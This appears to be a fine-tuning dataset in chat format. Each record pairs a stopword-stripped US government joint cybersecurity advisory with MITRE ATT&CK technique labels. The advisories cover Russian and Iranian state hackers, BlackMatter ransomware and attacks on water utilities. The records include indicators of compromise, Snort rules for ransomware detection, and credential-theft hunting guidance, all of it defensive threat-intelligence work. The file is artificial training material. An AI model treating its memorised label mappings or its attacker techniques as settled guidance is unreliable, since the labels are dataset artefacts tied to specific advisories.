cyber activity publicly attributed russian statesponsored apt actors us government reporting legal actions includes russian statesponsored apt actors targeting state local tribal territorial sltt governments aviation networks september 2020 least december 2020 russian statesponsored apt actors targeted dozens sltt government aviation networks actors successfully compromised networks exfiltrated data multiple victims russian statesponsored apt actors global energy sector intrusion campaign 2011 2018 russian statesponsored apt actors conducted multistage intrusion campaign gained remote access us international energy sector networks deployed icsfocused malware collected exfiltrated enterprise icsrelated data russian statesponsored apt actors campaign ukrainian critical infrastructure 2015 2016 russian statesponsored apt actors conducted cyberattack ukrainian energy distribution companies leading multiple companies experiencing unplanned power outages december 2015 actors deployed blackenergy malware steal user credentials used destructive malware component killdisk make infected computers inoperable 2016 actors conducted cyberintrusion campaign ukrainian electrical transmission company deployed crashoverride malware specifically designed attack power grids information recent historical russian statesponsored malicious cyber activity see referenced products cisagovrussia joint fbidhscisa csa russian foreign intelligence service svr cyber operations trends best practices network defenders joint nsafbicisa csa russian gru conducting global brute force campaign compromise enterprise cloud environments joint fbicisa csa russian statesponsored advanced persistent threat actor compromises us government targets joint cisafbi csa apt actors chaining vulnerabilities sltt critical infrastructure elections organizations cisas webpage remediating networks affected solarwinds active directorym365 compromise cisa alert russian government cyber activity targeting energy sector critical infrastructure sectors cisa ics alert cyberattack ukrainian critical infrastructure table 1 provides common publicly known ttps employed russian statesponsored apt actors map mitre attck enterprise framework version 10 note lists intended inclusive russian statesponsored actors modified ttps based public reporting1 therefore cisa fbi nsa anticipate russian statesponsored actors may modify ttps deem necessary reduce risk detection table 1 common tactics techniques employed russian statesponsored apt actors additional enterprise ttps used russian statesponsored apt actors see attck enterprise pages apt29 apt28 sandworm team respectively information ics ttps see attck ics pages sandworm team blackenergy 3 malware crashoveride malware blackenergys killdisk component notpetya malware detection given russian statesponsored apt actors demonstrated capability maintain persistent longterm access compromised enterprise cloud environments cisa fbi nsa encourage critical infrastructure organizations implement robust log collection retention without centralized log collection monitoring capability organizations limited ability investigate incidents detect threat actor behavior described advisory depending environment examples include native tools m365s sentinel thirdparty tools sparrow hawk crowdstrikes azure reporting tool crt review microsoft cloud environments detect unusual activity service principals application activity note guidance using detection tools refer cisa alert detecting postcompromise threat activity microsoft cloud environments look behavioral evidence network hostbased artifacts known russian statesponsored ttps see table 1 commonly observed ttps detect password spray activity review authentication logs system application login failures valid accounts look multiple failed authentication attempts across multiple accounts detect use compromised credentials combination vps follow steps look suspicious impossible logins logins changing username user agent strings ip address combinations logins ip addresses align expected users geographic location look one ip used multiple accounts excluding expected logins look impossible travel impossible travel occurs user logs multiple ip addresses significant geographic distance apart ie person could realistically travel geographic locations two ip addresses time period logins note implementing detection opportunity result false positives legitimate users apply vpn solutions connecting networks look processes program execution commandline arguments may indicate credential dumping especially attempts access copy ntdsdit file domain controller look suspicious privileged account use resetting passwords applying user account mitigations look unusual activity typically dormant accounts look unusual user agent strings strings typically associated normal user activity may indicate bot activity organizations otics systems take note unexpected equipment behavior example unexpected reboots digital controllers ot hardware software record delays disruptions communication field equipment ot devices determine system parts components lagging unresponsive incident response organizations detecting potential apt activity ot networks immediately isolate affected systems secure backups ensure backup data offline secure possible scan backup data antivirus program ensure free malware collect review relevant logs data artifacts consider soliciting support thirdparty organization provide subject matter expertise ensure actor eradicated network avoid residual issues could enable followon exploitation report incidents cisa andor fbi via local fbi field office fbis 247 cywatch 855 2923937 cywatchfbigov note ot assets organizations resilience plan addresses operate lose access toor control ofthe andor ot environment refer mitigations section information see joint advisory australia canada new zealand united kingdom united states technical approaches uncovering remediating malicious activity guidance hunting investigating network common mistakes incident handling cisa fbi nsa encourage critical infrastructure owners operators see cisas federal government cybersecurity incident vulnerability response playbooks although tailored federal civilian branch agencies playbooks provide operational procedures planning conducting cybersecurity incident vulnerability response activities detail step incident vulnerability response note organizations document incident response procedures cyber incident response plan organizations create exercise noted mitigations section mitigations cisa fbi nsa encourage organizations implement following recommendations increase cyber resilience threat prepared confirm reporting processes minimize coverage gaps develop internal contact lists assign main points contact suspected incident well roles responsibilities ensure personnel know report incident minimize gaps itot security personnel availability identifying surge support responding incident malicious cyber actors known target organizations weekends holidays gaps organizational cybersecuritycritical infrastructure organizations proactively protect minimizing gaps coverage ensure itot security personnel monitor key internal security capabilities identify anomalous behavior flag identified iocs ttps immediate response see table 1 commonly observed ttps create maintain exercise cyber incident response resilience plan continuity operations plan create maintain exercise cyber incident response continuity operations plan ensure personnel familiar key steps need take incident positioned act calm unified manner key questions personnel access need know processes ot assetsnetworks identify resilience plan addresses operate lose access toor control ofthe andor ot environment identify ot network interdependencies develop workarounds manual controls ensure ics networks isolated connections create risk safe reliable operation ot processes regularly test contingency plans manual controls safety critical functions maintained cyber incident ensure ot network operate necessary capacity even network compromised regularly test manual controls critical functions kept running ics ot networks need taken offline implement data backup procedures ot networks backup procedures conducted frequent regular basis regularly test backup procedures ensure backups isolated network connections could enable spread malware addition backing data develop recovery documents include configuration settings common devices critical ot equipment enable efficient recovery following incident enhance organizations cyber posture cisa fbi nsa recommend organizations apply best practices identity access management protective controls architecture vulnerability configuration management identity access management require multifactor authentication users without exception require accounts strong passwords allow passwords used across multiple accounts stored system adversary may access secure credentials russian statesponsored apt actors demonstrated ability maintain persistence using compromised credentials use virtualizing solutions modern hardware software ensure credentials securely stored disable storage clear text passwords lsass memory consider disabling limiting new technology local area network manager ntlm wdigest authentication implement credential guard windows 10 server 2016 refer microsoft manage windows defender credential guard information windows server 2012r2 enable protected process light local security authority lsa minimize active directory attack surface reduce malicious ticketgranting activity malicious activity kerberoasting takes advantage kerberos tgs used obtain hashed credentials attackers attempt crack set strong password policy service accounts audit domain controllers log successful kerberos tgs requests ensure events monitored anomalous activity secure accounts enforce principle least privilege administrator accounts minimum permission need tasks ensure unique distinct administrative accounts set administrative tasks create nonprivileged accounts privileged users ensure use non privileged accounts nonprivileged access eg web browsing email access protective controls architecture identify detect investigate abnormal activity may indicate lateral movement threat actor malware use network monitoring tools hostbased logs monitoring tools endpoint detection response edr tool edr tools particularly useful detecting lateral connections insight common uncommon network connections host enable strong spam filters enable strong spam filters prevent phishing emails reaching end users filter emails containing executable files prevent reaching end users implement user training program discourage users visiting malicious websites opening malicious attachments note cisa fbi nsa also recommend longerterm effort critical infrastructure organizations implement network segmentation separate network segments based role functionality network segmentation help prevent lateral movement controlling traffic flows betweenand access tovarious subnetworks appropriately implement network segmentation ot networks network segmentation limits ability adversaries pivot ot network even network compromised define demilitarized zone eliminates unregulated communication ot networks organize ot assets logical zones taking account criticality consequence operational necessity define acceptable communication conduits zones deploy security controls filter network traffic monitor communications zones prohibit ics protocols traversing network vulnerability configuration management update software including operating systems applications firmware network assets timely manner prioritize patching known exploited vulnerabilities especially cves identified csa critical high vulnerabilities allow remote code execution denialofservice internetfacing equipment consider using centralized patch management system ot networks use riskbased assessment strategy determine ot network assets zones participate patch management program consider signing cisas cyber hygiene services including vulnerability scanning help reduce exposure threats cisas vulnerability scanning service evaluates external network presence executing continuous scans public static ip addresses accessible services vulnerabilities use industry recommended antivirus programs set antivirusantimalware programs conduct regular scans network assets using uptodate signatures use riskbased asset inventory strategy determine ot network assets identified evaluated presence malware implement rigorous configuration management programs ensure programs track mitigate emerging threats review system configurations misconfigurations security weaknesses disable unnecessary ports protocols review network security device logs determine whether shut unnecessary ports protocols monitor common ports protocols command control activity turn disable unnecessary services eg powershell functionality within devices ensure ot hardware readonly mode increase organizational vigilance regularly review reporting threat consider signing cisa notifications receive timely information current security issues vulnerabilities highimpact activity resources information russian statesponsored malicious cyber activity refer cisagovrussia refer cisa analysis report strengthening security configurations defend attackers targeting cloud services steps guidance strengthening organizations cloud security practices leaders small businesses small local government agencies see cisas cyber essentials guidance developing actionable understanding implementing organizational cybersecurity practices critical infrastructure owners operators otics networks review following resources additional information nsa cisa joint csa nsa cisa recommend immediate actions reduce exposure across operational technologies control systems cisa factsheet rising ransomware threat operational technology assets additional recommendations rewards justice program information statesponsored russian cyber operations targeting us critical infrastructure contact department states rewards justice program may eligible reward 10 million dos offering information leading identification location person acting direction control foreign government participates malicious cyber activity us critical infrastructure violation computer fraud abuse act cfaa contact 12027027843 whatsapp signal telegram send information via rewards justice secure torbased tips line located dark web details refer rewardsforjusticenetmaliciouscyberactivity caveats information accessed received provided informational purposes cisa fbi nsa endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring cisa fbi nsa references1 joint ncsccisa uk advisory ttps associated svr cyber actors revisions january 11 2022 initial versionjanuary 25 2022 updated broken linkfebruary 28 2022 updated broken link product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003.003, T1059.003, T1078, T1090.003, T1110.001, T1110.003, T1190, T1212, T1552.004, T1555, T1558.003, T1587.001, T1595.002, T1598"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary actions take today protect iranian statesponsored malicious cyber activity immediately patch software affected following vulnerabilities cve202134473 201813379 202012812 20195591 implement multifactor authentication use strong unique passwordsv notethis advisory uses mitre adversarial tactics techniques common knowledge attck framework version 10 see attck enterprise referenced threat actor tactics techniques joint cybersecurity advisory result analytic effort among federal bureau investigation fbi cybersecurity infrastructure security agency cisa australian cyber security centre acsc united kingdoms national cyber security centre ncsc highlight ongoing malicious cyber activity advanced persistent threat apt group fbi cisa acsc ncsc assess associated government iran fbi cisa observed iranian governmentsponsored apt group exploit fortinet vulnerabilities since least march 2021 microsoft exchange proxyshell vulnerability since least october 2021 gain initial access systems advance followon operations include deploying ransomware acsc also aware apt group used microsoft exchange vulnerability australia iranian governmentsponsored apt actors actively targeting broad range victims across multiple us critical infrastructure sectors including transportation sector healthcare public health sector well australian organizations fbi cisa acsc ncsc assess actors focused exploiting known vulnerabilities rather targeting specific sectors iranian governmentsponsored apt actors leverage access followon operations data exfiltration encryption ransomware extortion advisory provides observed tactics techniques well indicators compromise iocs fbi cisa acsc ncsc assess likely associated iranian governmentsponsored apt activity fbi cisa acsc ncsc urge critical infrastructure organizations apply recommendations listed mitigations section advisory mitigate risk compromise iranian governmentsponsored cyber actors downloadable copy iocs see aa21321astix information iranian governmentsponsored malicious cyber activity see uscertcisagoviran click pdf version report technical details threat actor activity since least march 2021 fbi cisa observed iranian governmentsponsored apt actors leverage microsoft exchange fortinet vulnerabilities target broad range victims across multiple critical infrastructure sectors furtherance malicious activities observed activity includes following march 2021 fbi cisa observed iranian governmentsponsored apt actors scanning devices ports 4443 8443 10443 fortinet fortios vulnerability cve201813379 enumerating devices fortios vulnerabilities cve202012812 cve20195591 iranian governmentsponsored apt actors likely exploited vulnerabilities gain access vulnerable networks note previous fbi cisa reporting activity refer joint cybersecurity advisory apt actors exploit vulnerabilities gain initial access future attacks may 2021 iranian governmentsponsored apt actors exploited fortigate appliance access webserver hosting domain us municipal government actors likely created account username elie enable malicious activity note previous fbi reporting activity refer fbi flash apt actors exploiting fortinet vulnerabilities gain initial access malicious activity june 2021 apt actors exploited fortigate appliance access environmental control networks associated usbased hospital specializing healthcare children iranian governmentsponsored apt actors likely leveraged server assigned ip addresses 91214124143 1625513720which fbi cisa judge associated iranian government cyber activityto enable malicious activity hospitals network apt actors accessed known user accounts hospital ip address 1541619270 fbi cisa judge associated government iran offensive cyber activity october 2021 apt actors leveraged microsoft exchange proxyshell vulnerabilitycve202134473to gain initial access systems advance followon operations acsc considers apt group also used microsoft exchange vulnerability cve202134473 australia mitre attck tactics techniques fbi cisa acsc ncsc assess following tactics techniques associated activity resource development apt actors used following malicious legitimate tools variety tactics across enterprise spectrum mimikatz credential theft winpeas privilege escalation sharpwmi windows management instrumentation winrar archiving collected data filezilla transferring files initial access iranian governmentsponsored apt actors gained initial access exploiting vulnerabilities affecting microsoft exchange servers cve202134473 fortinet devices cve201813379 cve202012812 cve20195591 execution iranian governmentsponsored apt actors may made modifications task scheduler modifications may display unrecognized scheduled tasks actions specifically established tasks may associated activity synchronizetimezone googlechangemanagement microsoftoutlookupdater microsoftoutlookupdateschedule persistence iranian governmentsponsored apt actors may established new user accounts domain controllers servers workstations active directories accounts appear created look similar existing accounts network specific account names may vary per organization addition unrecognized user accounts accounts established masquerade existing accounts following account usernames may associated activity support help elie wadgutilityaccount exfiltration fbi cisa observed outbound file transfer protocol ftp transfers port 443 impact apt actors forced bitlocker activation host networks encrypt data corresponding threatening notes either sent victim left victim network txt file ransom notes included ransom demands following contact information saraddrprotonmailcom weareheresecmailpro nosterrmannmailcom nosterrmannprotonmailcom detection fbi cisa acsc ncsc recommend organizations using microsoft exchange servers fortinet investigate potential suspicious activity networks search iocs collect knownbad iocs search network host artifacts note refer appendix iocs investigate exposed microsoft exchange servers patched unpatched compromise investigate changes remote desktop protocol rdp firewall windows remote management winrm configurations may allow attackers maintain persistent access review domain controllers servers workstations active directories new unrecognized user accounts review task scheduler unrecognized scheduled tasks additionally manually review operatingsystem defined recognized scheduled tasks unrecognized actions example review steps scheduled task expected perform review antivirus logs indications unexpectedly turned look winrar filezilla unexpected locations note additional approaches uncovering malicious cyber activity see joint advisory technical approaches uncovering remediating malicious activity authored cisa cybersecurity authorities australia canada new zealand united kingdom mitigations fbi cisa acsc ncsc urge network defenders apply following mitigations reduce risk compromise threat patch update systems install updatespatch operating systems software firmware soon updatespatches released immediately patch software affected vulnerabilities identified advisory cve202134473 cve201813379 cve202012812 cve20195591 evaluate update blocklists allowlists regularly evaluate update blocklists allowlists fortios used organization add key artifact files used fortios organizations execution blocklist attempts install run program associated files prevented implement enforce backup restoration policies procedures regularly back data air gap password protect backup copies offline ensure copies critical data accessible modification deletion system data resides implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location eg hard drive storage device cloud implement network segmentation implement network segmentation restrict adversarys lateral movement secure user accounts audit user accounts administrative privileges configure access controls principles least privilege separation duties require administrator credentials install software implement multifactor authentication use multifactor authentication possible particularly webmail virtual private networks vpns accounts access critical systems use strong passwords require accounts password logins strong unique passwords secure monitor rdp potentially risky services use rdp restrict limit access resources internal networks disable unused remote accessrdp ports monitor remote accessrdp logs use antivirus programs install regularly update antivirus antimalware software hosts secure remote access use secure networks avoid using public wifi networks consider installing using vpn remote access reduce risk phishing consider adding email banner emails received outside organization disable hyperlinks received emails resources information iranian governmentsponsored malicious cyber activity see uscertcisagoviran information resources protecting responding ransomware refer stopransomwaregov centralized wholeofgovernment webpage providing ransomware resources alerts joint advisory cybersecurity authorities australia canada new zealand united kingdom united states technical approaches uncovering remediating malicious activity provides additional guidance hunting investigating network common mistakes avoid incident handling cisa offers range nocost cyber hygiene services help critical infrastructure organizations assess identify reduce exposure threats including ransomware requesting services organizations size could find ways reduce risk mitigate attack vectors us department states rewards justice rfj program offers reward 10 million reports foreign government malicious activity us critical infrastructure see rfj website information report information securely acsc provide tailored cyber security advice assistance reporting incident response support cybergovau via 1300 292 371 1300 cyber1 appendix indicators compromise ip addresses executables files listed downloadable copy iocs see aa21321astix ip addresses 91214124143 1625513720 1541619270 executable files executable files observed activity identified table 1 table 1 executable files appendix b mitre attck tactics techniques table 2 identifies mitre attck tactics techniques observed activity table 2 observed tactics techniques contact information report suspicious criminal activity related information found joint cybersecurity advisory contact local fbi field office athttpswwwfbigovcontactusfieldoffices fbis 247 cyber watch cywatch 855 2923937 email cywatchfbigov available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact request incident response resources technical assistance related threats contact cisa centralcisadhsgov australian organizations visit cybergovau call 1300 292 371 1300 cyber 1 report cybersecurity incidents access alerts advisories revisions november 17 2021 initial versionnovember 19 2021 added stix files product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1053.005, T1136.001, T1136.002, T1190, T1486, T1560.001, T1588.001, T1588.002"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary actions take protect blackmatter ransomware implement enforce backup restoration policies procedures use strong unique passwords use multifactor authentication implement network segmentation traversal monitoring notethis advisory uses mitre adversarial tactics techniques common knowledge attck framework version 9 see attck enterprise referenced threat actor tactics techniques joint cybersecurity advisory developed cybersecurity infrastructure security agency cisa federal bureau investigation fbi national security agency nsa provide information blackmatter ransomware since july 2021 blackmatter ransomware targeted multiple us critical infrastructure entities including two us food agriculture sector organizations advisory provides information cyber actor tactics techniques procedures ttps obtained sample blackmatter ransomware analyzed sandbox environment well trusted thirdparty reporting using embedded previously compromised credentials blackmatter leverages lightweight directory access protocol ldap server message block smb protocol access active directory ad discover hosts network blackmatter remotely encrypts hosts shared drives found ransomware attacks critical infrastructure entities could directly affect consumer access critical infrastructure services therefore cisa fbi nsa urge organizations including critical infrastructure organizations implement recommendations listed mitigations section joint advisory mitigations help organizations reduce risk compromise blackmatter ransomware attacks click herefor pdf version report technical details overview first seen july 2021 blackmatter ransomwareasaservice raas tool allows ransomwares developers profit cybercriminal affiliates ie blackmatter actors deploy victims blackmatter possible rebrand darkside raas active september 2020 may 2021 blackmatter actors attacked numerous usbased organizations demanded ransom payments ranging 80000 15000000 bitcoin monero tactics techniques procedures advisory provides information cyber actor ttps obtained following sample blackmatter ransomware analyzed sandbox environment well trusted third parties sha256 706f3eec328e91ff7f66c8f0a2fb9b556325c153a329a2062dc85879c540839d note click see samples page virustotal blackmatter variant uses embedded admin user credentialsthat previously compromised ntquerysysteminformation enumservicesstatusexw enumerate running processes services respectively blackmatter uses embedded credentials ldap smb protocol discover hosts ad srvsvcnetshareenumall microsoft remote procedure call msrpc function enumerate host accessible shares notably variant blackmatter leverages embedded credentials smb protocol remotely encrypt original compromised host discovered shares contents including admin c sysvol netlogon blackmatter actors use separate encryption binary linuxbased machines routinely encrypt esxi virtual machines rather encrypting backup systems blackmatter actors wipe reformat backup data stores appliances table 1 maps blackmatters capabilities mitre attck enterprise framework based analyzed variant trusted thirdparty reporting table 1 black matter actors ransomware ttps detection signatures following snort signatures may used detecting network activity associated blackmatter activity intrusion detection system rule alert tcp 445 msgblackmatter remote encryption attempt content01 00 00 00 00 00 05 00 01 00 content2e 00 52 00 45 00 41 00 44 00 4d 00 45 00 2e 00 74 00 distance100 detectionfilter track bysrc count 4 seconds 1 priority1 sid11111111111 inline intrusion prevention system rule alert tcp 445 msgblackmatter remote encryption attempt content01 00 00 00 00 00 05 00 01 00 content2e 00 52 00 45 00 41 00 44 00 4d 00 45 00 2e 00 74 00 distance100 priority1 sid10000001 ratefilter genid 1 sigid 10000001 track bysrc count 4 seconds 1 newaction reject timeout 86400 mitigations cisa fbi nsa urge network defenders especially critical infrastructure organizations apply following mitigations reduce risk compromise blackmatter ransomware implement detection signatures implement detection signatures identified signatures identify block placement ransom note first share encrypted subsequently blocking additional smb traffic encryptor system 24 hours use strong passwords require accounts password logins eg service account admin accounts domain admin accounts strong unique passwords passwords reused across multiple accounts stored system adversary may access note devices local administrative accounts implement password policy requires strong unique passwords individual administrative account implement multifactor authentication require multifactor authentication services extent possible particularly webmail virtual private networks accounts access critical systems patch update systems keep operating systems software date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats limit access resources network remove unnecessary access administrative shares especially admin c admin c deemed operationally necessary restrict privileges necessary service user accounts perform continuous monitoring anomalous activity use hostbased firewall allow connections administrative shares via smb limited set administrator machines implement network segmentation traversal monitoring adversaries use system network discovery techniques network system visibility mapping limit adversary learning organizations enterprise environment limit common system network discovery techniques taking following actions segment networks prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting adversary lateral movement identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring tool aid detecting ransomware implement tool logs reports network traffic including lateral movement activity network endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections host use admin disabling tools support identity privileged access management blackmatter uses compromised credentials nonbusiness hours compromise may detected given observed increase ransomware attacks nonbusiness hours especially holidays weekends cisa fbi nsa recommend organizations implement timebased access accounts set adminlevel higher example justintime jit access method provisions privileged access needed support enforcement principle least privilege well zero trust model process networkwide policy set place automatically disable admin accounts ad level account direct need account needed individual users submit requests automated process enables access system set timeframe support task completion disable commandline scripting activities permissions privilege escalation lateral movement often depend software utilities run command line threat actors able run tools difficulty escalating privileges andor moving laterally implement enforce backup restoration policies procedures maintain offline backups data regularly maintain backup restoration practice ensure organization severely interrupted irretrievable data held ransom demand ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructure cisa fbi nsa urge critical infrastructure organizations apply following additional mitigations reduce risk credential compromise disable storage clear text passwords lsass memory consider disabling limiting new technology local area network manager ntlm wdigest authentication implement credential guard windows 10 server 2016 refer microsoft manage windows defender credential guard information windows server 2012r2 enable protected process light local security authority lsa minimize ad attack surface reduce malicious ticketgranting activity malicious activity kerberoasting takes advantage kerberos ticket granting service used obtain hashed credentials attackers attempt crack set strong password policy service accounts audit domain controllers log successful kerberos ticketgranting service requests ensure events monitored anomalous activity refer cisamultistate information sharing center msisac joint ransomware guide general mitigations prepare reduce risk compromise ransomware attacks note critical infrastructure organizations industrial control systemsoperational technology networks review joint cisafbi cybersecurity advisory aa21131a darkside ransomware best practices preventing business disruption ransomware attacks mitigations including mitigations reduce risk severe business functional degradation entity fall victim ransomware attack responding ransomware attacks ransomware incident occurs organization cisa fbi nsa recommend following ransomware response checklist p 11 cisamultistate information sharing analysis center msisac joint ransomware guide scanning backups possible scan backup data antivirus program check free malware reporting incidents immediately fbi local fbi field office cisa uscertcisagovreport us secret service us secret service field office applying incident response best practices found joint advisory technical approaches uncovering remediating malicious activity developed cisa cybersecurity authorities australia canada new zealand united kingdom note cisa fbi nsa strongly discourage paying ransom criminal actors paying ransom may embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor may fund illicit activities paying ransom also guarantee victims files recovered resources information resources protecting responding ransomware refer stopransomwaregov centralized wholeofgovernment webpage providing ransomware resources alerts cisas ransomware readiness assessment rra nocost selfassessment based tiered set practices help organizations better assess well equipped defend recover ransomware incident cisa offers range nocost cyber hygiene services help critical infrastructure organizations assess identify reduce exposure threats including ransomware requesting services organizations size could find ways reduce risk mitigate attack vectors contact information victims ransomware report immediately cisa uscertcisagovreport local fbi field office us secret service field office available please include following information regarding incident date time location incident type activity number people affected type equipment used activity name submitting company organization designated point contact nsa client requirements general cybersecurity inquiries contact nsa cybersecurity requirements center 4108544200 cybersecurityrequestsnsagov document developed cisa fbi nsa furtherance respective cybersecurity missions including responsibilities develop issue cybersecurity specifications mitigations note information accessed provided informational purposes cisa fbi nsa endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring cisa fbi nsa revisions october 18 2021 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003.001, T1007, T1018, T1021.002, T1057, T1133, T1486, T1561, T1567"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary immediate actions wws facilities take protect malicious cyber activity click suspicious links use rdp secure monitor use strong passwords use multifactor authentication note advisory uses mitre adversarial tactics techniques common knowledge attck framework version 9 see attck enterprise referenced threat actor tactics techniques joint advisory result analytic efforts federal bureau investigation fbi cybersecurity infrastructure agency cisa environmental protection agency epa national security agency nsa highlight ongoing malicious cyber activityby known unknown actorstargeting information technology operational technology ot networks systems devices us water wastewater systems wws sector facilities activitywhich includes attempts compromise system integrity via unauthorized accessthreatens ability wws facilities provide clean potable water effectively manage wastewater communities notealthough cyber threats across critical infrastructure sectors increasing advisory intend indicate greater targeting wws sector versus others secure wws facilitiesincluding department defense dod water treatment facilities united states abroadagainst ttps listed cisa fbi epa nsa strongly urge organizations implement measures described recommended mitigations section advisory click herefor pdf version report technical details threat overview tactics techniques procedures wws facilities may vulnerable following common tactics techniques procedures ttps used threat actors compromise ot networks systems devices spearphishing personnel deliver malicious payloads including ransomware spearphishing one prevalent techniques used initial access networks personnel potential lack cyber awareness vulnerability within organization personnel may open malicious attachments links execute malicious payloads contained emails threat actors successfully bypassed email filtering controls organizations integrate ot systems attackers gain accesseither purposefully inadvertentlyto ot assets network compromised spearphishing techniques exploitation internetconnected services applications enable remote access wws networks example threat actors exploit remote desktop protocol rdp insecurely connected internet infect network ransomware rdp used process control equipment attacker could also compromise wws operations note increased use remote operations due covid19 pandemic likely increased prevalence weaknesses associated remote access exploitation unsupported outdated operating systems software threat actors likely seek take advantage perceived weaknesses among organizations either haveor choose prioritizeresources itot infrastructure modernization wws facilities tend allocate resources physical infrastructure need replacement repair eg pipes rather itot infrastructure fact wws facilities inconsistently resourced municipal systemsnot resources employ consistently high cybersecurity standardsmay contribute use unsupported outdated operating systems software exploitation control system devices vulnerable firmware versions wws systems commonly use outdated control system devices firmware versions expose wws networks publicly accessible remotely executable vulnerabilities successful compromise devices may lead loss system control denial service loss sensitive data wws sector cyber intrusions cyber intrusions targeting us wws facilities highlight vulnerabilities associated following threats insider threats current former employees maintain improperly active credentials ransomware attacks wws sector cyber intrusions 2019 early 2021 include august 2021 malicious cyber actors used ghost variant ransomware californiabased wws facility ransomware variant system month discovered three supervisory control data acquisition scada servers displayed ransomware message july 2021 cyber actors used remote access introduce zucano ransomware onto mainebased wws facilitys wastewater scada computer treatment system run manually scada computer restored using local control frequent operator rounds march 2021 cyber actors used unknown ransomware variant nevadabased wws facility ransomware affected victims scada system backup systems scada system provides visibility monitoring full industrial control system ics september 2020 personnel new jerseybased wws facility discovered potential makop ransomware compromised files within system march 2019 former employee kansasbased wws facility unsuccessfully attempted threaten drinking water safety using user credentials revoked time resignation remotely access facility computer mitigations fbi cisa epa nsa recommend wws facilitiesincluding dod water treatment facilities united states abroaduse riskinformed analysis determine applicability range technical nontechnical mitigations prevent detect respond cyber threats wws monitoring personnel responsible monitoring wws check following suspicious activities indicators may indicative threat actor activity inability wws facility personnel access scada system controls time either entirely part unfamiliar data windows system alerts appearing scada system controls facility data screens could indicate ransomware attack detection scada system controls water treatment personnel abnormal operating parameterssuch unusually high chemical addition ratesused safe proper treatment drinking water access scada systems unauthorized individuals groups eg former employees current employees authorizedassigned operate scada systems controls access scada systems unusual times may indicate legitimate users credentials compromised unexplained scada system restarts unchanging parameter values normally fluctuate remote access mitigations note increased use remote operations due covid19 pandemic increases necessity asset owneroperators assess risk associated enhanced remote access ensure falls within acceptable levels require multifactor authentication remote access ot network including network external networks utilize blocklisting allowlisting limit remote access users verified business andor operational need ensure remote access technologies logging enabled regularly audit logs identify instances unauthorized access utilize manual start stop features place always activated unattended access reduce time remote access services running audit networks systems using remote access services close unneeded network ports associated remote access services eg rdp transmission control protocoltcp port 3389 configuring access control host utilize custom settings limit access remote party attempt acquire network mitigations implement ensure robust network segmentation ot networks limit ability malicious cyber actors pivot ot network compromising network implement demilitarized zones dmzs firewalls jump servers oneway communication diodes prevent unregulated communication ot networks developupdate network maps ensure full accounting equipment connected network remove equipment networks required conduct operations reduce attack surface malicious actors exploit planning operational mitigations ensure organizations emergency response plan considers full range potential impacts cyberattacks pose operations including loss manipulation view loss manipulation control threats safety plan also consider third parties legitimate need ot network access including engineers vendors review test update emergency response plan annual basis ensure accuracy exercise ability fail alternate control systems including manual operation assuming degraded electronic communications allow employees gain decisionmaking experience via tabletop exercises incorporate loss visibility control scenarios utilize resources environment protection agencys epa cybersecurity incident action checklist well ransomware response checklist p 11 cisamultistate information sharing analysis center msisac joint ransomware guide safety system mitigations install independent cyberphysical safety systems systems physically prevent dangerous conditions occurring control system compromised threat actor examples cyberphysical safety system controls include size chemical feed pump gearing valves pressure switches etc types controls benefit wws sector facilitiesespecially smaller facilities limited cybersecurity capabilitybecause enable facility staff assess systems worstcase scenario determine protective solutions enabling cyberphysical safety systems allows operators take physical steps limit damage example preventing cyber actors gained control sodium hydroxide pump raising ph dangerous levels additional mitigations foster organizational culture cyber readiness see cisa cyber essentials along items listed resources section guidance update software including operating systems applications firmware network assets use riskbased assessment strategy determine ot network assets zones participate patch management program consider using centralized patch management system set antivirusantimalware programs conduct regular scans network assets using uptodate signatures use riskbased asset inventory strategy determine ot network assets identified evaluated presence malware implement regular data backup procedures ot networks regularly test backups ensure backups connected network prevent potential spread ransomware backups possible enable ot device authentication utilize encrypted version ot protocols encrypt wireless communications ensure confidentiality authenticity process control data transit employ user account management remove disable rename default system accounts wherever possible implement account lockout policies reduce risk bruteforce attacks monitor creation administratorlevel accounts thirdparty vendors robust privileged account management policies procedures implement user account policy includes set durations deactivation removal accounts employees leave organization accounts reach defined period inactivity implement data execution prevention controls application allowlisting software restriction policies prevent programs executing common ransomware locations temporary folders supporting popular internet browsers train users awareness simulations recognize report phishing social engineering attempts identify suspend access users exhibiting unusual activity fbi cisa epa nsa would like thank dragos well waterisac contributions advisory resources cyber hygiene services cisa offers range nocost cyber hygiene servicesincluding vulnerability scanning ransomware readiness assessmentsto help critical infrastructure organizations assess identify reduce exposure cyber threats taking advantage services organizations size receive recommendations ways reduce risk mitigate attack vectors rewards justice reporting us department states rewards justice rfj program offers reward 10 million reports foreign government malicious activity us critical infrastructure see rfj website information report information securely stopransomwaregov stopransomwaregov webpage interagency resource provides guidance ransomware protection detection response includes ransomware alerts reports resources cisa federal partners including cisa msisac joint ransomware guide cisa insights ransomware outbreak cisa webinar combating ransomware additional resources additional resources assist preventing mitigating activity see fbicisaepamsisac joint csa compromise us water treatment facility waterisac 15 cybersecurity fundamentals water wastewater utilities american water works association cybersecurity guidance assessment tool epa cybersecurity incident action checklist epa cybersecurity best practices water sector epa supporting cybersecurity measures clean water drinking water state revolving funds cisa cyber risks resources water wastewater systems sector infographic cisa critical ics 